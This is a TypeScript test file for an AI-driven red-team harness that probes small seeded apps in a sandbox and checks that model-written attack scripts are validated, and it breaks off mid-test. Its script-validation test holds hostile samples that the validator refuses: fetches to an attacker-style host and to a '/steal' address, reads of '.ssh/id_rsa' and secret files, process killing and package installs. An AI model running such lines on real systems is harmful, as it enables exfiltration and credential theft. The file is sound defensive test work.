// Phase 86 (harness track M11, docs/design/HARNESS_TRACK.md §3 M11): red-team mode.
// - probe generation per entry kind (HTTP query/body/path, the command line; messages not probed);
// - crash / exit / hang / stack-trace / secret-echo detection against small seeded apps
//   (express-style and Python http.server-style) really run in an M5 sandbox copy;
// - insecure-default probes: true positives and near misses;
// - attacker scripts: validation (other hosts/ports, installs, process stopping, paths outside the
//   copy are refused); without OS isolation they wait for the owner's OK, never run by themselves;
// - the Reviewing model's second pass: unreproducible and unquoted candidates are dropped;
// - "Fix what broke": the re-check re-runs the reproducing probe, the tests run, never a push, a
//   lesson when applied; the budget ceiling; the ship gate; settings, routes, member isolation;
//   evals (countFindings); UI files, translations, tips, the service worker.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { join } from 'node:path';
import { test } from 'node:test';
import { OwnerAuth } from '../src/auth.ts';
import { runTurn, type ChatEvent } from '../src/chat.ts';
import { countFindings } from '../src/evals.ts';
import { OWNER_SETTINGS } from '../src/household.ts';
import type { ChatRequest, Provider, ProviderConfig, StreamEvent } from '../src/providers/types.ts';
import { breaksIn, citeFromTrace, DRIVER_SOURCE, insecureDefaults, maskSecrets, paramsOf, planProbes, probesFor, subRoutes, validateScript, VALUE_SETS, type Exchange } from '../src/redteam-probes.ts';
import { isShipAction, RedTeam, redteamSettings } from '../src/redteam.ts';
import { RunStore } from '../src/runs.ts';
import { SandboxGate, sandboxGateSettings, type Isolation } from '../src/sandbox-run.ts';
import { FindingStore } from '../src/security/findings.ts';
import { FixBranches } from '../src/security/fix.ts';
import { gitLog } from '../src/security/git.ts';
import { jsonIn } from '../src/security/pass.ts';
import { analyze, type Entry } from '../src/security/threat-graph.ts';
import { createSaraServer } from '../src/server.ts';
import { RecallIndex } from '../src/triggers.ts';
import type { Tool } from '../src/tools/types.ts';
import { workspaceDir } from '../src/tools/workspace.ts';
import { makeApp, ROOT, tempDir, text, call, type TestApp } from './helpers.ts';
import { EXPRESS_SERVER, expressProject, FAKE_KEY, pythonProject, smallProject, writeFiles } from './redteam-fixtures.ts';

const NOW = new Date('2026-10-30T15:00:00Z');
const COPY: Isolation = { driver: 'copy', isolated: false, label: 'Not isolated (test)' };
const ISOLATED: Isolation = { driver: 'copy', isolated: true, label: 'Isolated (test)' };
const HAS_GIT = spawnSync('git', ['--version'], { stdio: 'ignore' }).status === 0;
const PY = ['python3', 'python'].find((p) => spawnSync(p, ['--version'], { stdio: 'ignore' }).status === 0);
const PORTS: [number, number] = [7891, 7899];

const g = (cwd: string, ...args: string[]) => {
  const r = spawnSync('git', ['-c', 'user.name=Test', '-c', 'user.email=test@example.invalid', '-c', 'commit.gpgsign=false', ...args], { cwd, encoding: 'utf8' });
  return (r.stdout ?? '').trim();
};

/** A scripted "brain" for the three model roles (attacker, reviewer, fixer): answers from the prompt. */
class Brain implements Provider {
  readonly config: ProviderConfig;
  readonly app: TestApp;
  readonly h: { attack?: (user: string) => string; review?: (user: string) => string; fix?: (user: string) => string; usage?: number };
  constructor(config: ProviderConfig, app: TestApp, h: Brain['h']) {
    this.config = config;
    this.app = app;
    this.h = h;
  }
  async listModels(): Promise<string[]> {
    return ['m'];
  }
  async *stream(req: ChatRequest): AsyncIterable<StreamEvent> {
    this.app.requests.push(structuredClone({ ...req, signal: undefined }));
    const sys = String(req.messages[0]?.content ?? '');
    const user = String(req.messages.at(-1)?.content ?? '');
    const out = sys.includes('probe scripts') ? this.h.attack?.(user) : sys.includes('second pass of a red-team run') ? this.h.review?.(user) : sys.includes('red-team breaks') ? this.h.fix?.(user) : '';
    yield { type: 'text', text: out ?? '' };
    yield { type: 'usage', input: this.h.usage ?? 900, output: 100 };
  }
}

function setup(t: { after: (fn: () => void) => void }, o: { scripts?: number; budget?: number; reviewer?: boolean; iso?: Isolation } = {}) {
  const { dir, cleanup } = tempDir();
  const app = makeApp(dir, { now: NOW });
  t.after(() => {
    app.store.close();
    cleanup();
  });
  app.settings.update({
    providers: [{ id: 'p', label: 'P', kind: 'openai-compatible', baseUrl: 'http://x' }],
    defaultProviderId: 'p',
    defaultModel: 'm',
    ownerName: 'Alex',
    timeZone: 'America/Chicago',
    disclosureAcceptedAt: NOW.toISOString(),
    securityPass: { mode: 'ask', reviewer: o.reviewer ?? true, advisories: false, budgetTokens: 30_000, runTests: true },
    redteam: { ship: 'ask', scripts: o.scripts ?? 0, budgetTokens: o.budget ?? 30_000, minutes: 5 },
  });
  app.runs = new RunStore(app.store.db, app.now);
  app.findings = new FindingStore(app.store.db, app.now);
  app.recall = new RecallIndex(app.store.db, app.now);
  app.sandboxGate = new SandboxGate(join(dir, 'cache', 'sandbox-runs'), app.sandbox, () => sandboxGateSettings(app.settings.get()), () => o.iso ?? COPY);
  app.fixes = new FixBranches(app, join(dir, 'cache', 'fix-branches'));
  app.redteam = new RedTeam(app, app.findings, app.store.db);
  app.redteam.isolation = () => o.iso ?? COPY;
  app.redteam.timing = { startMs: 15_000, reqMs: 2_500 };
  const conv = app.store.createConversation({ mode: 'coding' });
  const ws = workspaceDir(dir, conv.workspace);
  mkdirSync(ws, { recursive: true });
  return { app, dir, ws, conv };
}

function repo(ws: string): string {
  g(ws, 'init', '-q', '-b', 'main');
  g(ws, 'add', '.');
  g(ws, 'commit', '-qm', 'init');
  const remote = `${ws}-remote.git`;
  spawnSync('git', ['init', '-q', '--bare', remote]);
  g(ws, 'remote', 'add', 'origin', remote);
  return remote;
}

async function run(app: TestApp, ws: string, conv: { id: string; workspace: string }) {
  const r = app.redteam!.start({ workspace: conv.workspace, wsDir: ws, conversationId: conv.id, ports: PORTS });
  return (await app.redteam!.running.get(r.id)!.promise)!;
}

// ------------------------------------------------------------------------------------------------
// 1. Probe generation per entry kind
// ------------------------------------------------------------------------------------------------

test('probes: per entry kind, only the catalogue\'s generic values, capped; messages are not probed', () => {
  const files = {
    'server.js': [
      "const app = require('./lib/router')();",
      "app.get('/sum', (req, res) => {",
      '  const parts = req.query.nums.split(",");',
      '  res.json({ n: req.query.limit });',
      '});',
      "app.post('/items/:id', (req, res) => {",
      '  const { name, qty } = req.body;',
      '  res.json({ id: req.params.id, name, qty });',
      '});',
      "process.on('message', (m) => console.log(m));",
    ].join('\n'),
    'cli.js': "const name = process.argv[2];\nconsole.log(name.toUpperCase());\n",
  };
  const a = analyze(Object.keys(files), (f) => files[f as keyof typeof files]);
  const by = (label: string) => a.entries.find((e) => e.label === label)!;
  const get = by('GET /sum');
  const p = paramsOf(files['server.js'], get);
  assert.deepEqual(p.query.sort(), ['limit', 'nums']);
  const probes = probesFor(get, p);
  assert.ok(probes.length > 10 && probes.length <= 40);
  const kinds = new Set(probes.map((x) => x.kind));
  for (const k of ['baseline', 'missing', 'empty', 'huge', 'unicode', 'path', 'quotes', 'number', 'type', 'duplicate']) assert.ok(kinds.has(k as never), k);
  // Every value sent comes from the catalogue: decode the query values and check them.
  const allowed = new Set<string>(['test', '1', '2', ...Object.values(VALUE_SETS).flat()]);
  for (const x of probes) {
    if (x.type !== 'http') continue;
    const q = x.path.split('?')[1] ?? '';
    for (const pair of q.split('&').filter(Boolean)) {
      const v = pair.slice(pair.indexOf('=') + 1);
      let dec = v;
      try {
        dec = decodeURIComponent(v);
      } catch {
        dec = decodeURIComponent(v.replace('%00%FF', ''));
      }
      assert.ok(allowed.has(dec) || allowed.has(dec.replace(/\u0000.*$/, '')), `unexpected value ${JSON.stringify(dec).slice(0, 80)}`);
    }
  }
  const post = by('POST /items/:id');
  const pp = paramsOf(files['server.js'], post);
  assert.deepEqual(pp.body.sort(), ['name', 'qty']);
  assert.deepEqual(pp.path, ['id']);
  const pprobes = probesFor(post, pp);
  assert.ok(pprobes.some((x) => x.kind === 'malformed-json'), 'malformed JSON for a body');
  assert.ok(pprobes.some((x) => x.kind === 'nested'), 'deep nesting');
  assert.ok(pprobes.some((x) => x.type === 'http' && x.path.includes('99999999999999999999')), 'a path parameter out of range');
  const cli = a.entries.find((e) => e.kind === 'cli')!;
  const cp = probesFor(cli, paramsOf(files['cli.js'], cli));
  assert.ok(cp.length >= 5 && cp.every((x) => x.type === 'cli'));
  assert.ok(cp.some((x) => x.type === 'cli' && x.args.length === 0), 'no arguments');
  const msg = a.entries.find((e) => e.kind === 'message');
  assert.ok(msg, 'the message handler is an entry');
  assert.equal(probesFor(msg!, { query: [], body: [], path: [] }).length, 0, 'messages are not probed');
  // Many entries: the whole plan is capped.
  const many: Entry[] = Array.from({ length: 20 }, (_, i) => ({ ...get, id: `E${i}`, label: `GET /r${i}`, path: `/r${i}` }));
  const plan = planProbes(many.map((e) => ({ entry: e, params: p })));
  assert.equal(plan.probes.length, 200);
  assert.ok(plan.capped > 0);
  // Plain servers: routes inside one createServer / http.server handler become their own targets.
  const sub = subRoutes(['s.js', 'app.py'], (f) => (f === 's.js' ? "http.createServer((req, res) => {\n  const u = new URL(req.url, 'http://x');\n  if (u.pathname === '/add') { res.end(String(Number(u.searchParams.get('a')) + 1)); }\n});" : "class H(BaseHTTPRequestHandler):\n    def do_POST(self):\n        if self.path == '/save':\n            pass\n"));
  assert.deepEqual(sub.map((e) => e.label), ['GET /add', 'POST /save']);
  assert.deepEqual(paramsOf("http.createServer((req, res) => {\n  const u = new URL(req.url, 'http://x');\n  if (u.pathname === '/add') { res.end(String(Number(u.searchParams.get('a')) + 1)); }\n});", sub[0]).query, ['a']);
});

test('detection: exit, 5xx, uncaught, hang, stack trace and secret echo; client errors are not breaks; secrets are masked', () => {
  const x = (o: Partial<Exchange>): Exchange => ({ probe: 'p', status: 200, ms: 1, timedOut: false, body: '', exited: false, log: [], ...o });
  assert.deepEqual(breaksIn(x({})), []);
  assert.deepEqual(breaksIn(x({ status: 400, body: 'nums must be a short list' })), [], 'a 400 is good behaviour');
  assert.deepEqual(breaksIn(x({ status: 404 })), []);
  assert.deepEqual(breaksIn(x({ status: 500, log: ['TypeError: x.split is not a function', '    at h (/w/server.js:3:9)'] })), ['crash']);
  assert.deepEqual(breaksIn(x({ status: null, error: 'ECONNRESET', exited: true, exitCode: 1 })), ['exit']);
  assert.deepEqual(breaksIn(x({ status: null, timedOut: true })), ['timeout']);
  assert.deepEqual(breaksIn(x({ status: null, error: 'ECONNRESET', log: ['Traceback (most recent call last):', '  File "/w/app.py", line 12, in do_GET', "KeyError: 'age'"] })), ['uncaught'], 'a dropped connection with a traceback');
  assert.deepEqual(breaksIn(x({ status: 400, body: 'TypeError: boom\n    at Object.handler (C:\\w\\server.js:43:40)' })), ['stack-trace']);
  assert.deepEqual(breaksIn(x({ body: `{"detail":"${FAKE_KEY}"}` })), ['secret-echo']);
  assert.deepEqual(breaksIn(x({ body: '{"detail":"abcdefgh1234"}' }), ['abcdefgh1234']), ['secret-echo'], 'a value from the env file');
  assert.deepEqual(breaksIn(x({ status: null, error: 'client: ERR_INVALID_CHAR' })), [], 'the request could not even be made');
  assert.deepEqual(breaksIn(x({ status: null, error: 'restart: port busy' })), []);
  assert.ok(!maskSecrets(`key ${FAKE_KEY} end`, []).includes(FAKE_KEY));
  assert.ok(!maskSecrets('v=abcdefgh1234', ['abcdefgh1234']).includes('abcdefgh1234'));
  // The cited line: the first frame in a project file (dependencies and internals skipped).
  const trace = 'TypeError: x\n    at f (node:internal/timers:1:1)\n    at g (C:\\\\copy\\\\ws\\\\node_modules\\\\lib\\\\a.js:4:1)\n    at Object.handler (C:\\copy\\ws\\server.js:12:32)';
  assert.deepEqual(citeFromTrace(trace, ['server.js', 'lib/router.js']), { file: 'server.js', line: 12 });
  assert.deepEqual(citeFromTrace('Traceback (most recent call last):\n  File "/usr/lib/python3/socketserver.py", line 3, in x\n  File "/workspace/app.py", line 12, in do_GET\nKeyError', ['app.py']), { file: 'app.py', line: 12 });
  // The driver is a valid ES module, only ever connects to 127.0.0.1, and only stops its own children.
  const { dir, cleanup } = tempDir();
  try {
    writeFileSync(join(dir, 'd.mjs'), DRIVER_SOURCE);
    assert.equal(spawnSync(process.execPath, ['--check', join(dir, 'd.mjs')]).status, 0);
  } finally {
    cleanup();
  }
  assert.ok(!/host:\s*(?!\s|'127\.0\.0\.1')/.test(DRIVER_SOURCE), 'connections go to 127.0.0.1 only');
  assert.match(DRIVER_SOURCE, /was already in use before the app started/);
  assert.ok(!/process\.kill\((?!-child\.pid)/.test(DRIVER_SOURCE), 'only its own children are stopped');
});

// ------------------------------------------------------------------------------------------------
// 2. Seeded apps, really run in a sandbox copy
// ------------------------------------------------------------------------------------------------

test('express-style app in a sandbox copy: the five seeded breaks with their lines, the guarded twins stay quiet, insecure defaults, all on the run', { skip: !HAS_GIT }, async (t) => {
  const { app, ws, conv } = setup(t, { reviewer: false });
  expressProject(ws);
  repo(ws);
  const before = readFileSync(join(ws, 'server.js'), 'utf8');
  const plan = app.redteam!.plan(conv.workspace, ws);
  assert.equal(plan.tests, 'npm test');
  assert.equal('command' in plan.start && plan.start.command, 'node server.js');
  assert.equal(plan.isolation.isolated, false);
  assert.deepEqual(plan.budget, { tokens: 30_000, minutes: 5 });
  const r = await run(app, ws, conv);
  assert.equal(r.status, 'done', r.error);
  assert.equal(r.app?.started, true, r.app?.why ?? '');
  assert.ok(r.app!.port! >= PORTS[0] && r.app!.port! <= PORTS[1], 'the app ran on a port the harness picked');
  assert.equal(r.tests?.exitCode, 0);
  const found = r.breaks.filter((b) => b.by === 'probe').map((b) => `${b.entry} ${b.kind}`).sort();
  assert.deepEqual(found, ['GET /note exit', 'GET /repeat timeout', 'GET /shout stack-trace', 'GET /status secret-echo', 'GET /sum crash']);
  const lineOf = (s: string) => EXPRESS_SERVER.split('\n').findIndex((l) => l.includes(s)) + 1;
  const sum = r.breaks.find((b) => b.entry === 'GET /sum')!;
  assert.equal(sum.file, 'server.js');
  assert.equal(sum.line, lineOf("const parts = req.query.nums.split(',');"), 'the stack frame\'s own line');
  assert.equal(r.breaks.find((b) => b.entry === 'GET /note')!.line, lineOf("throw new RangeError('note too long')"));
  assert.ok(!r.breaks.some((b) => /safe-/.test(b.entry)), 'the guarded twins');
  // The secret never reaches the report or the findings table.
  assert.ok(!JSON.stringify(r).includes(FAKE_KEY), 'secret masked in the report');
  assert.ok(!JSON.stringify(app.findings!.list({ workspace: conv.workspace, status: 'all' })).includes(FAKE_KEY), 'secret masked in findings');
  // Insecure defaults: the committed .env (key name quoted, never the value) and missing headers.
  const defaults = r.breaks.filter((b) => b.by === 'default').map((b) => b.kind).sort();
  assert.deepEqual(defaults, ['env-committed', 'missing-headers']);
  assert.equal(r.breaks.find((b) => b.kind === 'env-committed')!.quote, 'PAYMENT_KEY=');
  // The findings table: source redteam, quotes checked; the reproduction steps on each.
  const rows = app.findings!.list({ workspace: conv.workspace, source: 'redteam' });
  assert.equal(rows.length, 7);
  for (const f of rows.filter((x) => x.meta.probe === 'probe')) {
    assert.ok(f.quote && readFileSync(join(ws, f.file!), 'utf8').split(/\r?\n/)[f.line! - 1].includes(f.quote), `quote of #${f.id}`);
    assert.ok(f.meta.input && f.meta.observed && f.meta.reproduced === true);
  }
  // Every probe and result is on the run (M3, kind redteam).
  const runView = app.runs!.get(r.runId!)!;
  assert.equal(runView.kind, 'redteam');
  const tools = app.runs!.steps(r.runId!).flatMap((s) => s.tools);
  assert.ok(tools.filter((x) => x.name === 'redteam_probe').length === r.tried.probes);
  assert.ok(tools.some((x) => x.name === 'redteam_reproduce'));
  assert.ok(tools.some((x) => x.name === 'redteam_tests'));
  // The real workspace was never touched; nothing left behind in the sandbox folder.
  assert.equal(readFileSync(join(ws, 'server.js'), 'utf8'), before);
  assert.equal(g(ws, 'status', '--porcelain'), '');
  assert.ok(!existsSync(join(ws, '.sara-redteam')));
});

test('python http.server-style app: a dropped connection with a traceback is a break at its line; the guarded twin stays quiet', { skip: !PY }, async (t) => {
  const { app, ws, conv } = setup(t, { reviewer: false });
  pythonProject(ws);
  const r = await run(app, ws, conv);
  assert.equal(r.app?.started, true, r.app?.why ?? '');
  const b = r.breaks.filter((x) => x.by === 'probe');
  assert.deepEqual(b.map((x) => `${x.entry} ${x.kind}`), ['GET /age uncaught']);
  assert.equal(b[0].file, 'app.py');
  assert.equal(b[0].quote, "age = int(q['age'][0])");
  assert.ok(!r.breaks.some((x) => x.kind === 'missing-headers'), 'this app sends the headers');
});

// ------------------------------------------------------------------------------------------------
// 3. Insecure defaults
// ------------------------------------------------------------------------------------------------

test('insecure defaults: true positives and near misses', () => {
  const files: Record<string, string> = {
    'app.py': "from flask import Flask\napp = Flask(__name__)\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True)\n",
    'safe.py': "import os\napp.run(host='127.0.0.1', debug=os.environ.get('DEBUG') == '1')\n",
    'server.js': "app.use(cors());\nconst ADMIN_PASSWORD = 'admin';\napp.listen(3000, '0.0.0.0');\nres.setHeader('Access-Control-Allow-Origin', '*');\n",
    'server2.js': "app.use(cors({ origin: 'https://shop.example' }));\nconst ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;\napp.listen(3000, '127.0.0.1');\n// const password = 'admin';\n",
    'config/settings.json': '{ "debug": true, "db": { "password": "changeme" } }\n',
    'config/prod.json': '{ "debug": false, "db": { "password": "${DB_PASSWORD}" } }\n',
    '.env': `PAYMENT_KEY=${FAKE_KEY}\nDB_PASSWORD=password\n`,
    '.env.example': 'PAYMENT_KEY=your-key-here\n',
    'test/fixtures/conf.json': '{ "password": "admin" }\n',
  };
  const found = insecureDefaults(Object.keys(files), (f) => files[f], { tracked: new Set(Object.keys(files)), mode: (f) => (f === 'app.py' ? 0o100666 : 0o100644) });
  const got = found.map((f) => `${f.rule.replace('redteam:', '')} ${f.file ?? '-'}:${f.line ?? 0}`).sort();
  assert.deepEqual(got, ['cors-wildcard server.js:1', 'cors-wildcard server.js:4', 'debug-on app.py:4', 'debug-on config/settings.json:1', 'default-credentials .env:2', 'default-credentials config/settings.json:1', 'default-credentials server.js:2', 'env-committed .env:1', 'listen-all app.py:4', 'listen-all server.js:3', 'world-writable -:0']);
  assert.ok(found.every((f) => f.source === 'redteam' && f.origin === 'code'));
  assert.ok(!JSON.stringify(found).includes(FAKE_KEY), 'the committed key is never quoted');
  // An env file git ignores is not "committed".
  const untracked = insecureDefaults(['.env'], (f) => files[f], { tracked: new Set() });
  assert.ok(!untracked.some((f) => f.rule === 'redteam:env-committed'));
});

// ------------------------------------------------------------------------------------------------
// 4. Attacker scripts
// ------------------------------------------------------------------------------------------------

test('attacker scripts: only APP_URL; other hosts and ports, installs, programs, process stopping and paths outside the copy are refused', () => {
  const ok = "const r = await fetch(process.env.APP_URL + '/sum?nums[a]=1');\nconsole.log(r.status);\n";
  assert.deepEqual(validateScript(ok, 'node'), { ok: true, problems: [] });
  assert.ok(validateScript("import json, os, urllib.request\ntry:\n    urllib.request.urlopen(os.environ['APP_URL'] + '/age?age=')\nexcept Exception as e:\n    print(e)\n", 'python').ok);
  const bad: [string, RegExp, 'node' | 'python'][] = [
    ["await fetch('http://198.51.100.7/x'); await fetch(process.env.APP_URL);", /address|IP/, 'node'],
    ["await fetch('https://evil.example.com/' + process.env.APP_URL);", /another address|internet host/, 'node'],
    ["await fetch('http://127.0.0.1:22/'); await fetch(process.env.APP_URL);", /another address/, 'node'],
    ["import { execSync } from 'node:child_process'; execSync('npm install left-pad'); fetch(process.env.APP_URL);", /starts other programs|installs/, 'node'],
    ["process.kill(1234); fetch(process.env.APP_URL);", /stops processes/, 'node'],
    ["import os\nos.kill(1, 9)\nprint(os.environ['APP_URL'])", /stops processes/, 'python'],
    ["import fs from 'node:fs'; fs.readFileSync('../../secrets.txt'); fetch(process.env.APP_URL);", /outside the copy/, 'node'],
    ["import fs from 'node:fs'; fs.readFileSync('C:/Users/someone/.ssh/id_rsa'); fetch(process.env.APP_URL);", /outside the copy/, 'node'],
    ["import fs from 'node:fs'; fs.writeFileSync('x.txt', 'y'); fetch(process.env.APP_URL);", /writes or deletes files/, 'node'],
    ["import net from 'node:net'; net.connect(80, 'x'); fetch(process.env.APP_URL);", /imports node:net|own sockets/, 'node'],
    ["eval('fetch(process.env.APP_URL)')", /builds or loads code/, 'node'],
    ["fetch(process.env.APP_URL + process.env.HOME)", /environment values other than APP_URL/, 'node'],
    ["import subprocess\nsubprocess.run(['pip', 'install', 'requests'])\nprint(os.environ['APP_URL'])", /starts other programs|installs|imports subprocess/, 'python'],
    ["import socket\ns = socket.socket()\nprint(os.environ['APP_URL'])", /imports socket|sockets/, 'python'],
    ["console.log('no target')", /only through APP_URL/, 'node'],
  ];
  for (const [code, why, lang] of bad) {
    const v = validateScript(code, lang);
    assert.equal(v.ok, false, code);
    assert.ok(v.problems.some((p) => why.test(p)), `${code} → ${v.problems.join('; ')}`);
  }
});

const SCRIPT_OK = "const r = await fetch(process.env.APP_URL + '/sum?nums[a]=1');\nconsole.log(r.status);\n";
const SCRIPT_BAD = "await fetch('http://198.51.100.7/steal');\nawait fetch(process.env.APP_URL + '/');\n";
const attack = (user: string) => (user.includes('were refused by the checks') ? '{"scripts":[]}' : JSON.stringify({ scripts: [{ lang: 'node', purpose: 'nums as an object', code: SCRIPT_OK }, { lang: 'node', purpose: 'reach elsewhere', code: SCRIPT_BAD }] }));
/** A reviewer that confirms every candidate the prompt lists, citing its input, its first observed line and its code line. */
function confirmAll(user: string): string {
  const breaks = [...user.matchAll(/^(C\d+(?:S\d+)?) \((\w[\w-]*)[^\n]*\ninput: ([^\n]+)\nobserved:\n([^\n]+)[\s\S]*?(?:code found by the stack trace: ([^:\n]+):(\d+): ([^\n]+))?(?=\n\nC\d|\n\nThe code)/gm)].map((m) => ({ id: m[1], real: true, severity: 'high', title: `It breaks (${m[2]})`, input: m[3].slice(0, 30), observed: m[4].slice(0, 20), file: m[5] ?? 'server.js', line: Number(m[6] ?? 1), quote: m[7] ?? 'app.get(' }));
  return JSON.stringify({ breaks });
}

test('attacker scripts without OS isolation: shown, never run until the owner approves; the bad one is refused; approved ones run through the recording proxy', { skip: !HAS_GIT }, async (t) => {
  const { app, ws, conv } = setup(t, { scripts: 3 });
  smallProject(ws);
  repo(ws);
  app.providerFactory = (config) => new Brain(config, app, { attack, review: confirmAll });
  const r = await run(app, ws, conv);
  assert.equal(r.status, 'awaiting');
  assert.deepEqual(r.scripts.map((s) => [s.id, s.status]), [['S1', 'awaiting'], ['S2', 'rejected']]);
  assert.ok(r.scripts[1].problems!.some((p) => /address|IP/.test(p)));
  assert.equal(r.tried.scripts, 0, 'nothing the model wrote ran by itself');
  assert.ok(!app.runs!.steps(r.runId!).flatMap((s) => s.tools).some((x) => x.name === 'redteam_script_run'));
  const after = await app.redteam!.approveScripts(r.id, ['S1']);
  const done = (await app.redteam!.running.get(after.id)?.promise) ?? app.redteam!.get(r.id)!;
  assert.equal(done.status, 'done', done.error);
  assert.equal(done.tried.scripts, 1);
  assert.equal(done.scripts[0].status, 'ran');
  const fromScript = done.breaks.filter((b) => b.by === 'script');
  assert.equal(fromScript.length, 1, JSON.stringify([done.dropped, app.runs!.steps(r.runId!).flatMap((s) => s.tools).filter((x) => /script|repro/.test(x.name)).map((x) => [x.name, x.output])]));
  assert.match(fromScript[0].input, /GET \/sum\?nums\[a\]=1 \(from script S1\)/);
  assert.equal(fromScript[0].kind, 'crash');
  await assert.rejects(() => app.redteam!.approveScripts(r.id, ['S1']), /No probe scripts are waiting/);
});

test('attacker scripts with OS isolation run without waiting (still validated); the Reviewing model must cite input, output and line, and reproduce', { skip: !HAS_GIT }, async (t) => {
  const { app, ws, conv } = setup(t, { scripts: 3, iso: ISOLATED });
  smallProject(ws);
  repo(ws);
  let reviewPrompt = '';
  app.providerFactory = (config) =>
    new Brain(config, app, {
      // The refused script comes back once with the checks' reasons; the rewrite passes them.
      attack: (user) => (user.includes('were refused by the checks') ? JSON.stringify({ scripts: [{ lang: 'node', purpose: 'fixed', code: SCRIPT_OK.replace('nums[a]=1', 'nums[b]=2') }] }) : attack(user)),
      review: (user) => {
        reviewPrompt = user;
        const all = JSON.parse(confirmAll(user)).breaks as Record<string, unknown>[];
        // /sum: kept (input, output and its line cited). /shout: the output is not the observed one → dropped.
        // The script's break: not real (dropped). Anything else is left out (dropped).
        const out = all
          .map((b) => {
            const c = new RegExp(`^${b.id} \\(([\\w-]+)\\)[^\\n]*at GET /(\\w+)`, 'm').exec(user);
            const route = c?.[2] ?? '';
            if (String(b.id).includes('S')) return { ...b, real: false };
            if (route === 'sum') return b;
            if (route === 'shout') return { ...b, observed: 'HTTP 200 all good' };
            return null;
          })
          .filter(Boolean);
        return JSON.stringify({ breaks: out });
      },
    });
  const r = await run(app, ws, conv);
  assert.equal(r.status, 'done', r.error);
  assert.deepEqual(r.scripts.map((s) => [s.id, s.status]), [['S1', 'ran'], ['S2', 'rejected'], ['S3', 'ran']]);
  assert.equal(r.scripts[2].note, 'rewritten after the checks');
  assert.ok(app.requests.some((q) => String(q.messages.at(-1)?.content).includes('S2 (node): it names another address')), 'the reasons go back to the model');
  assert.equal(r.reviewer.ran, true);
  // The flaky /order break (only after other requests) did not happen again in a fresh copy.
  assert.ok(r.dropped.some((d) => d.why === 'did not happen again in a fresh copy' && /\/order/.test(d.input ?? '')), JSON.stringify(r.dropped));
  assert.ok(!/^input: GET \/order/m.test(reviewPrompt), 'unreproducible candidates never reach the reviewer');
  assert.ok(r.dropped.some((d) => d.why === 'the review did not cite the observed output' && /\/shout/.test(d.input ?? '')));
  assert.ok(r.dropped.some((d) => d.why === 'the Reviewing model found it is not a real problem' && /script S1/.test(d.input ?? '')));
  assert.deepEqual(r.breaks.filter((b) => b.by !== 'default').map((b) => b.entry), ['GET /sum']);
  const f = app.findings!.get(r.breaks.find((b) => b.entry === 'GET /sum')!.findingId)!;
  assert.equal(f.origin, 'model');
  assert.equal(f.meta.reviewed, true);
  assert.match(f.quote!, /req\.query\.nums\.split/);
});

// ------------------------------------------------------------------------------------------------
// 5. Fix what broke, never a push, a lesson; the budget
// ------------------------------------------------------------------------------------------------

test('fix what broke: the re-check sends the breaking input again, the tests run, Apply writes only the fix, a lesson, never a push', { skip: !HAS_GIT }, async (t) => {
  const { app, ws, conv } = setup(t, { reviewer: false });
  smallProject(ws);
  const remote = repo(ws);
  const r = await run(app, ws, conv);
  const sum = r.breaks.find((b) => b.entry === 'GET /sum' && b.kind === 'crash')!;
  assert.ok(sum, JSON.stringify(r.breaks.map((b) => [b.entry, b.kind])));
  gitLog.length = 0;
  let fixPrompts = 0;
  app.providerFactory = (config) =>
    new Brain(config, app, {
      fix: () => {
        fixPrompts++;
        // Try 1 changes the line but still crashes on a missing value; try 2 checks the value.
        return fixPrompts === 1
          ? JSON.stringify({ edits: [{ file: 'server.js', find: "  const parts = req.query.nums.split(',');", replace: "  const parts = String(req.query.nums).split(',').map((x) => x.trim());\n  if (req.query.nums.length > 100) return res.status(400).send('too long');" }] })
          : JSON.stringify({ edits: [{ file: 'server.js', find: "  const parts = req.query.nums.split(',');", replace: "  if (typeof req.query.nums !== 'string') return res.status(400).send('nums must be a list like 1,2,3');\n  const parts = req.query.nums.split(',');" }], note: 'Answer 400 when nums is missing or not text.' });
      },
    });
  const started = app.fixes!.startBatch([sum.findingId]);
  assert.match(started.fixBranch!, /^sara\/redteam-fix-\d+$/);
  const done = (await app.fixes!.running.get(sum.findingId)!.promise)!;
  assert.equal(done.fix!.state, 'ready', done.fix!.error);
  assert.equal(done.fix!.attempts, 2, 'the first try still broke on the same input');
  assert.match(String(app.requests.at(-1)!.messages[1].content), /the same input still breaks it/);
  assert.match(String(app.requests.at(-1)!.messages[0].content), /fix-only pass/);
  assert.equal(done.fix!.batch!.results![String(sum.findingId)].fixed, true);
  assert.equal(done.fix!.tests!.ran, true);
  assert.equal(done.fix!.tests!.exitCode, 0, done.fix!.tests!.output);
  // The re-check ran the probe in sandbox copies (recorded on the fix's own run).
  const fixRun = app.runs!.get(done.fix!.runId!)!;
  assert.equal(fixRun.kind, 'redteam');
  // Apply: only server.js; the owner's branch has no new commit; never pushed.
  const head = g(ws, 'rev-parse', 'HEAD');
  const applied = app.fixes!.apply(sum.findingId);
  assert.equal(applied.status, 'fixed');
  assert.match(readFileSync(join(ws, 'server.js'), 'utf8'), /nums must be a list like 1,2,3/);
  assert.equal(g(ws, 'rev-parse', 'HEAD'), head);
  assert.equal(g(ws, 'branch', '--list', 'sara/redteam-fix-*'), '');
  assert.equal(spawnSync('git', ['ls-remote', remote], { encoding: 'utf8' }).stdout.trim(), '');
  assert.ok(!gitLog.some((a) => a.includes('push') || a.includes('fetch') || a.includes('remote')), JSON.stringify(gitLog));
  // M10: the fixed break became a lesson quoting the input, the error and the change.
  const lesson = app.memory!.list({ kind: 'lesson' }).find((m) => /red-team probe: GET \/sum/.test(m.content));
  assert.ok(lesson, 'a lesson note');
  assert.ok(app.recall!.lessons(5).some((l) => /red-team probe/.test(l.command) && l.memoryId === lesson!.id));
  // A new run: the same input no longer breaks it.
  const again = await run(app, ws, conv);
  assert.ok(!again.breaks.some((b) => b.entry === 'GET /sum'), JSON.stringify(again.breaks.map((b) => b.entry)));
});

test('budget: shown up front and enforced: no model call past it, the fixed probes still run', { skip: !HAS_GIT }, async (t) => {
  const { app, ws, conv } = setup(t, { scripts: 3, budget: 10_000, iso: ISOLATED });
  smallProject(ws);
  repo(ws);
  // The attacker's one call spends almost the whole budget: the reviewer is not asked.
  app.providerFactory = (config) => new Brain(config, app, { attack: () => '{"scripts":[]}', review: confirmAll, usage: 9_500 });
  const calls = app.requests.length;
  const plan = app.redteam!.plan(conv.workspace, ws);
  assert.deepEqual(plan.budget, { tokens: 10_000, minutes: 5 });
  const r = await run(app, ws, conv);
